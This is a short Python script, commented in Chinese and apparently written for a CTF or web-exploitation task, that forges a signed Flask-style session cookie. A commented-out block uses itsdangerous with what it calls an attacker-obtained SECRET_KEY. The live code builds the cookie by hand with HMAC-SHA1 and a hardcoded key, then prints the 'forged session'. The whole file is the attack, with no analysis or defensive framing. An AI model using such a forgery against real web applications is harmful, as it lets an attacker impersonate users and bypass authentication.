# from itsdangerous import URLSafeTimedSerializer
#
# # 攻击者获取的SECRET_KEY
# secret_key = 'my_secret_123'
#
# # 初始化序列化工具
# serializer = URLSafeTimedSerializer(secret_key)
#
# # 生成带签名的Session字符串（即Cookie值）
# fake_session = serializer.dumps({"role":"user","username":"a"})
# print(f"伪造的Session Cookie值：{fake_session}")
# # 输出示例：'eyJ1c2VyX2lkIjoiYWRtaW4i...'.'abc123...'（数据部分.签名部分）
import json
import base64
import hmac
import hashlib

# 构造目标Session数据
session_data = {"role":"user","username":"a"}
data_json = json.dumps(session_data, separators=(',', ':'))
data_b64 = base64.urlsafe_b64encode(data_json.encode()).rstrip(b'=')

# 使用SECRET_KEY生成签名
secret_key = b"#mu0cw9F#7bBCoF!"
signature = hmac.new(secret_key, data_b64, hashlib.sha1).digest()
signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=')

# 拼接伪造的Session
fake_session = f"{data_b64.decode()}.{signature_b64.decode()}"
print(f"伪造的Session: {fake_session}")